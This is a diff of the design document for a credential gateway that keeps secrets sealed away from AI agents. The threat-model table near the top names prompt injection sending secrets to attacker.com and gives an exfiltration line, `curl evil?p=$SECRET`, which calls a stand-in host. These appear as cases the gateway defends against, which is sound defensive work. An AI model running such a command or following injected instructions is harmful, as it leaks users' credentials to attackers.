@@ -18,7 +18,7 @@ model ──(request containing enc:v1 tokens)──▶ gate proxy :8080 ──(
 | Model reads the secret | It only ever holds ciphertext; there is no `decrypt` verb |
 | Prompt injection sends the secret to attacker.com | Allowed hosts are sealed inside the token; wrong host → HTTP 403 |
 | Request to attacker.com with `Host: allowed.example` (or domain fronting through a CDN) | Policy uses the address the proxy really connects to; a Host header naming another host is refused |
-| Model runs `curl evil?p=$SECRET` | `secret_exec` only runs whitelisted templates with validated args (no args starting with `-`); the value goes in by env or stdin, never on a command line |
+| Model runs `curl evil?p=$SECRET` | `secret_exec(argv, env)` opens only tokens sealed for use `exec` (a website password never is); the value goes in by environment variable, never on a command line, and the command's output is redacted. A command that deliberately sends the value elsewhere is "stealing on purpose", which gate-simple-v0 §0 does not claim to stop |
 | Site or command echoes the value back (whole, cut, split, re-cased, base64, hex, escaped) | One redactor (`redact.py`) on every exit to the model: every encoding of the whole value, any case, and every run of 4+ characters of it, so no more than 3 consecutive characters of a value survive; what cannot be redacted (body over 4 MiB, undecodable content-encoding, redactor error) is withheld, never passed through (`tests/test_no_reconstruct.py`) |
 | Token pasted into a tool that bypasses the gate | Site receives the literal ciphertext: login fails, nothing leaks |
 | Private key leaks | Install the gate service (`secret-gate system install`, below): keys belong to the role account `_agentswitchgate`, unreadable for the login user; without it, keep `~/.secret-gate/` deny-listed for agents |
@@ -83,10 +83,10 @@ theirs. The login user's processes (daemon, executors, their shells, the browser
 
 ```
 /Library/Application Support/AgentSwitch/          root:wheel 0755
-  gate/            _agentswitchgate 0700   SECRET_GATE_HOME and HOME of both services: keys/ (keys/legacy/),
-                                           current, refs.sqlite3, logs/{proxy,rpc}.log, logs/rpc-audit.jsonl,
-                                           mitmproxy/ (CA + key), exec_templates.json, upstream-insecure.txt,
-                                           screenshot-mask.json; dirs 0700, files 0600
+  gate/            _agentswitchgate 0700   SECRET_GATE_HOME and HOME of both services: key.priv, key.pub (the one
+                                           keypair), refs.sqlite3, logs/{proxy,rpc}.log, logs/rpc-audit.jsonl,
+                                           mitmproxy/ (CA + key), upstream-insecure.txt, screenshot-mask.json;
+                                           dirs 0700, files 0600
   gate-public/     _agentswitchgate 0755   keys.json (0644), ca.pem (0644), gate.sock (0666, peer-uid checked)
   runtime/         root:wheel               python/ + secret-gate/ copied from the App bundle, VERSIONS,
                                            bin/secret-gate (wrapper → python/bin/secret-gate)
@@ -102,28 +102,28 @@ directories; `Umask 077`, `RunAtLoad`, `KeepAlive`; output to `gate/logs/{proxy,
 ```bash
 # root (the Mac app asks for an administrator once)
 secret-gate system install --owner-uid $(id -u) --port 8080 \
-    --runtime /path/AgentSwitch.app/Contents/Resources/runtime --migrate-from ~/.secret-gate \
-    [--import-config] [--dry-run]
+    --runtime /path/AgentSwitch.app/Contents/Resources/runtime [--dry-run]
 secret-gate system update --runtime …/runtime [--port N] [--dry-run]    # swap runtime/, restart; data stays
+secret-gate system rotate-key [--dry-run]                              # new keypair; every existing token dies
 secret-gate system uninstall [--delete-keys] [--dry-run]                # keys and the account stay by default
 # anyone
 secret-gate system status [--json]
 ```
 
 `install` creates the account (`dseditgroup`, `sysadminctl -addUser _agentswitchgate … -roleAccount`),
-the directories, the runtime copy and gate-service.json; migrates the old home: every keypair becomes a
-**legacy** keypair (decrypt only, never current again; `keys retire <name>` takes one out of use; `keys restore <name>` brings it back within 30 days), a new keypair `main`
-becomes current, `refs.sqlite3` (rebuilt from its valid rows, never taken over as a file),
-`screenshot-mask.json` and old logs move in. `exec_templates.json` and `upstream-insecure.txt` were writable by
-every process of the login user, so they move in only with `--import-config`; without it the plan and the report
-list them as not imported, with what they would do (template names, argv, env, stdin; the hosts whose upstream
-certificate would go unchecked), and they stay in `~/.secret-gate` (the Mac app does not pass the flag). Generates a new
-mitmproxy CA in `gate/mitmproxy/` and publishes `ca.pem`; writes and bootstraps both LaunchDaemons and
-waits until `status` reports the proxy running and the migrated keys. Only then are the originals deleted
-(each only where an identical copy is in the service), the old CA private key in `~/.mitmproxy` removed and
-`~/.secret-gate/MOVED.txt` written. Any failing step stops the run and lists what was done and what was not;
-nothing is rolled back. Root touches the login user's directories only through `O_NOFOLLOW` directory
-descriptors. The runtime is copied the same way: the bundle's `python/`, `secret-gate/` and `VERSIONS` are never
+the directories, the runtime copy and gate-service.json; generates the gate's one keypair in `gate/` (kept if
+one is there already) and a new mitmproxy CA in `gate/mitmproxy/`, publishes `keys.json` and `ca.pem`; writes
+and bootstraps both LaunchDaemons and waits until `status` reports the proxy running and the same public key.
+It never reads or changes the login user's home (gate-simple-v0 §1, §6): nothing is migrated from
+`~/.secret-gate`. `--migrate-from` and `--user-home` are still accepted for older callers and ignored. Any failing
+step stops the run and lists what was done and what was not; nothing is rolled back. The rpc service generates
+a keypair itself if it starts without one.
+
+`rotate-key` (root, through the same administrator prompt as install) replaces the keypair, republishes
+`keys.json`, chowns the new files to the service account and sends the proxy SIGHUP
+(`launchctl kill SIGHUP system/com.agentswitch.gate.proxy`), which reloads the key; then it waits for `status` to
+list the new public key. Every token sealed to the old key stops opening and has to be sealed again. The runtime
+is copied the hardened way: the bundle's `python/`, `secret-gate/` and `VERSIONS` are never
 followed if they are symlinks, every entry is opened relative to its parent with `O_NOFOLLOW`, must belong to the
 bundle's owner (no hard link to a root-only file) and be a regular file, directory or symlink; links are kept and
 must stay inside the copy; modes are set as the copy is made, nothing outside it is ever chmodded. Stop a gate the Mac app started itself before installing: the service's proxy needs the port.
@@ -136,21 +136,20 @@ rpc answered and the proxy is up; `updateAvailable` compares with the runtime th
 
 **`gate.sock`** (`secret-gate rpc`): one JSON object per line, `{"id", "method", "params"}` →
 `{"id", "ok": true, "result"}` or `{"id", "ok": false, "error"}`, requests ≤ 1 MiB, one thread per
-connection. Only root and `ownerUid` are let in (the kernel's peer uid). Methods: `status`, `keys.list`,
-`keys.new {name, use?}`, `keys.use {name}`, `keys.retire {name}`, `keys.restore {name}`, `refs.register {scope, tokens}`,
-`refs.release {scope}`, `credential.info {token}`, `credential.reissue {token, host, purpose}`,
+connection. Only root and `ownerUid` are let in (the kernel's peer uid). Methods (exactly these,
+gate-simple-v0 §2): `status`, `refs.register {scope, tokens}`, `refs.release {scope}`,
 `mcp.describe|otp {scope?, token}`, `mcp.http {scope?, method, url, headers?, body?}`,
-`mcp.exec {scope?, template, token, args?}`, `mcp.repair {scope?, token, host, purpose?, repairUrl?, repairKey?}`,
+`exec.resolve {scope?, token}` → `{value, label}` (use `exec` only; for `secret_exec`, which runs the command in the
+login user's MCP process), `browser.register {scope, token}`, `browser.config`,
 `browser.resolve {scope?, token, host}` (use `fill` only, `host` = the page's `host:port`),
-`browser.register {scope, token}`, `browser.config`, `logs.tail {name: proxy|rpc, lines ≤ 500}`. Every call
-is audited in `gate/logs/rpc-audit.jsonl` (no values). After a key change the service rewrites `keys.json`
-and sends SIGHUP to the proxy (pid from `gate/proxy.pid`), which reloads every key.
+`logs.tail {name: proxy|rpc, lines ≤ 500}`. There is no method that manages keys. Every call is audited in
+`gate/logs/rpc-audit.jsonl` (labels, never values).
 
 **Service mode of the CLI.** When `$SECRET_GATE_PUBLIC/gate.sock` (default `<root>/gate-public/gate.sock`)
 exists and belongs to another user, the CLI is the service's client, with unchanged output: `keys [--json]`,
-`pubkey` and `enc` read `keys.json`; `keys new|use|retire|restore`, `refs register|release`, `credential-info|reissue`
-go over the socket; `mcp` forwards every tool call to `mcp.*` with this process's `SECRET_GATE_SCOPE` and
-repair bridge; `browser` still runs Playwright as you but types values from `browser.resolve`, registers
+`pubkey` and `enc` read `keys.json`; `refs register|release` and `logs tail` go over the socket; `mcp` forwards
+`secret_describe|otp|http` to `mcp.*` with this process's `SECRET_GATE_SCOPE` and runs `secret_exec` itself with
+values from `exec.resolve`; `browser` still runs Playwright as you but types values from `browser.resolve`, registers
 sealed page data with `browser.register`, takes the mask config from `browser.config` and keeps the
 downstream's output in a temporary directory of yours; `bootstrap` checks `keys.json` and the published
 `ca.pem`. `keygen`, `check`, `proxy`, `service`, `install-ca` and `rpc` are refused ("凭据网关由系统服务管理，
@@ -176,23 +175,19 @@ travels as `SSL_CERT_FILE` / `REQUESTS_CA_BUNDLE` / `NODE_EXTRA_CA_CERTS` in the
 harness only. (`secret-gate install-ca`, by contrast, trusts the CA in the login keychain for every
 app of this user.)
 
-## Named keypairs
+## The keypair
 
 ```bash
-secret-gate keys                         # list; * marks the current one
-secret-gate keys new work --use          # create and make current
-secret-gate keys new home                # create without switching
-secret-gate keys use home                # switch: new tokens are minted for "home"
+secret-gate keygen                       # without the gate service: create the one keypair
+secret-gate keygen --force               # replace it: every token sealed to the old one stops working
+secret-gate keys [--json]                # show it
 ```
 
-Keypairs live in `<home>/keys/<name>/`; a legacy `<home>/key.priv` is listed as `default`.
-The proxy and MCP server decrypt with **every** keypair present, so switching never breaks
-tokens minted earlier. A native macOS front end for all of this is in `packages/secret-gate-ui`.
-
-Keypairs in `<home>/keys/legacy/<name>/` (what the gate service's install makes of an old home) only
-decrypt: `keys use` refuses them, `keys retire <name>` takes one out of use (its tokens stop working; the current
-keypair cannot be retired). A retired keypair is moved to `keys/retired/` and `keys restore <name>` brings it back
-for 30 days; after that it is deleted. `keys --json` rows are `{"name", "public", "current", "legacy"}`.
+The gate has exactly one keypair (gate-simple-v0 §1): `<home>/key.priv` (0600) and `<home>/key.pub`. Directories
+of the former multi-key layout (`keys/`, `current`) are ignored. `keys --json` prints a list with one row
+`{"name": "main", "public", "current": true, "legacy": false, "created"}` (`created`: ISO 8601 UTC), or `[]` when
+there is no key. With the gate service, install makes the key and `secret-gate system rotate-key` (root) replaces
+it; `keygen` is refused.
 
 ## Encrypt a secret
 
@@ -213,21 +208,25 @@ otherwise a password for one of them would be accepted by all of them.
 
 Give the token to the agent as if it were the password. Uses: `http` (proxy, `secret_http` and
 browser fills), `fill` (browser fills only: the proxy and `secret_http` refuse it), `otp`
-(`secret_otp`), `exec` (`secret_exec` with `exec_templates.json`).
+(`secret_otp`), `exec` (`secret_exec`).
 
-`exec_templates.json` (see `config/exec_templates.example.json`):
+### `secret_exec(argv, env)` (gate-simple-v0 §2.1)
 
 ```json
-{"psql": {"argv": ["psql", "-h", "{ARG0}", "-U", "{ARG1}", "-c", "{ARG2}"], "env": {"PGPASSWORD": "{SECRET}"}, "max_args": 3},
- "tool": {"argv": ["/usr/local/bin/tool", "login", "--password-stdin"], "stdin": "{SECRET}\n"}}
+{"argv": ["sh", "-c", "psql -h db.internal -U app -c 'select 1'"], "env": {"PGPASSWORD": "enc:ref:…"}}
 ```
 
-`{SECRET}` may appear only in `env` values and `stdin`: a template with `{SECRET}` in `argv` is refused when the
-templates load (a command line is visible to every user of the machine). `{ARGn}` are the caller's args, only in
-`argv`; each must match `[A-Za-z0-9._@:/=+,-]`, at most 256 characters, and may not start with `-` (an option). The
-child gets only `PATH`, `LANG`, `LC_ALL`, `LC_CTYPE`, `TZ` from the gate plus the template's `env`; its stdin is
-the template's `stdin` or empty. stdout and stderr are redacted before they return. `exec` is not bound to the
-token's hosts: whatever host a template lets the caller name gets the value, so keep templates to what you trust.
+`argv` is the agent's own command (no shell unless it runs one) and may not contain any `enc:` value: a command
+line is visible to every process on the machine. `env` maps 1–32 upper-case names to exactly one `enc:v1:` token
+or `enc:ref:` reference each; names that steer a loader, an interpreter or the base environment are refused
+(`LD_*`, `DYLD_*`, `PATH`, `HOME`, `PYTHON*`, `NODE_*`, `BASH_ENV`, `GIT_*`, `LC_*`, …). Only tokens sealed with use
+`exec` open. The command runs as the login user in the `secret-gate mcp` process, never as the gate service (an
+arbitrary command there could read the service's private key); with the service, the values come from
+`exec.resolve`. The child's environment is `PATH=/usr/local/bin:/opt/homebrew/bin:/usr/bin:/bin:/usr/sbin:/sbin`,
+this process's `HOME`, `LANG`, `LC_ALL`, `TZ`, `TMPDIR`, and the resolved variables; stdin is empty; the working
+directory is the MCP process's; 60 s at most. stdout and stderr go through the shared redactor, so `env`,
+`printenv` or `set -x` show `[REDACTED:label]`; a stream over 4 MiB is withheld whole. `exec` is not bound to the
+token's hosts: the value goes wherever the command sends it.
 
 ## Short references (`enc:ref:`)
 
@@ -241,8 +240,8 @@ echo '{"scope":"<same>"}' | secret-gate refs release        # {"released": 1}
 ```
 
 - A reference is only a pointer: the ciphertext behind it keeps its hosts and uses, and every
-  entry point (proxy, `secret_http`, `secret_exec`, `secret_otp`, `secret_describe`, `secret_fill`,
-  `secret_repair`) checks it exactly as if the token had been given.
+  entry point (proxy, `secret_http`, `secret_exec`, `secret_otp`, `secret_describe`, `secret_fill`)
+  checks it exactly as if the token had been given.
 - It resolves only inside its **execution scope**: the gate MCP and browser gate get
   `SECRET_GATE_SCOPE`, shell tools a proxy URL `http://scope:<scope>@127.0.0.1:8080` (sent as
   `Proxy-Authorization`, stripped before the request leaves). No scope, another task's scope or a
@@ -424,7 +423,7 @@ An MCP stdio server that spawns another MCP server (the unmodified Playwright MC
 - `BOUNDARY.md` lists every entry point with its rule, failure behaviour and guarding tests, and the
   known gaps (content that changes between snapshot and capture, closed Shadow DOM, cross-origin
   frames missing from the snapshot, fields no pattern recognizes).
-- The downstream runs with the parent env minus proxy variables, the repair bridge, the scope and
+- The downstream runs with the parent env minus proxy variables, the scope and
   the transfer grant (its browser gets the proxy from `--proxy-server`), with cwd and `--output-dir` in `$SECRET_GATE_HOME/browser-out` (0700), and
   every file it persists there (unredacted page snapshots, console and network logs) is deleted
   after each call.
@@ -452,19 +451,19 @@ agents work in.
 ```
 secret_gate/
   constants.py   errors.py      policy.py      crypto.py      tokens.py
-  otp.py         keystore.py    resolver.py    redact.py      exec_templates.py
+  otp.py         keystore.py    keyring.py     resolver.py    redact.py
   gate_ops.py    proxy_addon.py mitm_entry.py  mcp_server.py  cli.py
   upstream_tls.py reload.py     service.py     bootstrap.py   harness_config.py  proxy_probe.py
-  refs.py        refs_cli.py    credential_repair.py           audit.py
+  refs.py        refs_cli.py    audit.py
   browser_mcp.py browser_gate.py browser_policy.py browser_probe.py browser_mask.py
   pii.py         transfer.py
   service_paths.py publish.py   proxy_pid.py   rpc_protocol.py rpc_server.py rpc_methods.py rpc_client.py
   service_cli.py mcp_backend.py remote_resolver.py enc_cli.py
-  system_plan.py system_ops.py  system_exec.py system_cli.py migrate.py  user_dir.py   (gate service, docs/gate-service-v0.md)
+  system_plan.py system_ops.py  system_exec.py system_cli.py   (gate service, docs/gate-service-v0.md)
 tests/           unit tests per module + test_scenarios.py (12 end-to-end cases)
 BOUNDARY.md      entry-point checklist (docs/gate-next-v0.md §4), checked by tests/test_boundary_checklist.py
 tests/fixtures/  fabricated credentials / PII used by the suite (nothing real)
-config/          per-agent snippets, exec template example
+config/          per-agent snippets
 scripts/env.sh   proxy + CA environment
 ```
 
@@ -492,7 +491,7 @@ could impersonate it and receive the substituted secret.
 
 - Sites that hash the password in browser JS or validate the field format: the proxy cannot
   see a placeholder there. Use `secret_fill` (browser section above). WebSocket/gRPC logins and
-  request signing outside the browser: a template under `secret_exec`.
+  request signing outside the browser: a command of your own under `secret_exec`.
 - Responses are redacted by the redactor's rules (gate-simple-v0 §3.1): whole value in the listed
   encodings, any case, and every 4-character fragment of the raw value. Fragments of an *encoded*
   form are not matched (the encoding's untouched characters are raw fragments anyway); MIME-wrapped
